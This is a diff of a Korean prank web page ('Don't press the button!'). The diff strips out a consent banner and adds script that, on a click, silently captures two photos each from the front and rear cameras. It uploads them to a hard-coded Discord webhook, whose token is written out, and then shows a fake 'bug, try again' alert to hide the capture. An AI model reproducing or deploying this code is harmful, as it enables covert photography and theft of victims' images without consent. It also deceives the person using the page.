@@ -2,118 +2,81 @@
 <html lang="ko">
 <head>
   <meta charset="UTF-8">
-  <title>하하</title>
+  <title>버튼을 누르지마세요!</title>
   <style>
-    body {
-      font-family: Arial;
-      text-align: center;
-      margin-top: 30px;
-    }
-    video, canvas {
-      width: 300px;
-      border-radius: 12px;
-      margin-top: 10px;
-    }
-    button {
-      padding: 12px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 15px;
-    }
-    #consent {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: #222;
-      color: #fff;
-      padding: 15px;
-      text-align: center;
-      display: none;
-    }
+    body { text-align: center; font-family: Arial; margin-top: 30px; }
+    video, canvas { width: 300px; border-radius: 12px; margin-top: 10px; }
+    button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
   </style>
 </head>
 <body>
 
-<h2>버튼을 절대 누르지마시오!</h2>
-
-<button id="startBtn" disabled>버튼</button>
+<h2>버튼을 누르지마세요!</h2>
+<button id="startBtn">버튼</button>
 
 <br>
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
-<!-- 동의 배너 -->
-<div id="consent">
-  이 사이트는 접속 환경 정보를 수집합니다.
-  <button onclick="acceptConsent()">동의</button>
-</div>
-
 <script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1462758530867265591/MaQo0lAdsm7ai9PyWm-xV3XVImaU25BZIffI6oBO3uCXPIw0OhlGMT2q0hSsKDwyyu89";
 
-const startBtn = document.getElementById("startBtn");
-const consentBox = document.getElementById("consent");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
+const startBtn = document.getElementById("startBtn");
 
-// ----- 동의 처리 -----
-function getInfo() {
-  return {
-    ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    time: new Date().toLocaleString()
-  };
-}
+const PHOTOS_PER_CAMERA = 2;
+const INTERVAL = 1500;
 
-function sendInfoToDiscord(info) {
-  fetch(WEBHOOK_URL, {
+async function sendToDiscord(blob, name, label) {
+  const form = new FormData();
+  form.append("file", blob, name);
+  form.append("content", label);
+
+  await fetch(WEBHOOK_URL, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content:
-`✅ 사용자 동의
-- 브라우저: ${info.ua}
-- 언어: ${info.lang}
-- 화면: ${info.screen}
-- 시간: ${info.time}`
-    })
+    body: form
   });
 }
 
-function acceptConsent() {
-  localStorage.setItem("consent", "yes");
-  consentBox.style.display = "none";
-  startBtn.disabled = false;
-  sendInfoToDiscord(getInfo());
+async function captureSequence(facingMode, label) {
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode }
+  });
+
+  video.srcObject = stream;
+  await new Promise(r => setTimeout(r, 1000));
+
+  for (let i = 1; i <= PHOTOS_PER_CAMERA; i++) {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    await new Promise(resolve => {
+      canvas.toBlob(async blob => {
+        await sendToDiscord(
+          blob,
+          `${label}_${i}.png`,
+          `📸 ${label} ${i}번째`
+        );
+        resolve();
+      }, "image/png");
+    });
+
+    await new Promise(r => setTimeout(r, INTERVAL));
+  }
+
+  stream.getTracks().forEach(t => t.stop());
 }
 
-if (!localStorage.getItem("consent")) {
-  consentBox.style.display = "block";
-} else {
-  startBtn.disabled = false;
-}
-
-// ----- 카메라 기능 -----
 startBtn.addEventListener("click", async () => {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-
-    setTimeout(() => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
-
-      canvas.style.display = "block";
-      video.style.display = "none";
-
-      stream.getTracks().forEach(t => t.stop());
-    }, 2000);
+    await captureSequence("user", "ㅋㅋ");
+    await captureSequence("environment", "ㅎㅎ");
+    alert("버그걸렸습니다! 다시해주세요");
   } catch (e) {
-    alert("다시 시도 해주세요");
+    alert("버그걸렸습니다! 다시해주세요!");
   }
 });
 </script>
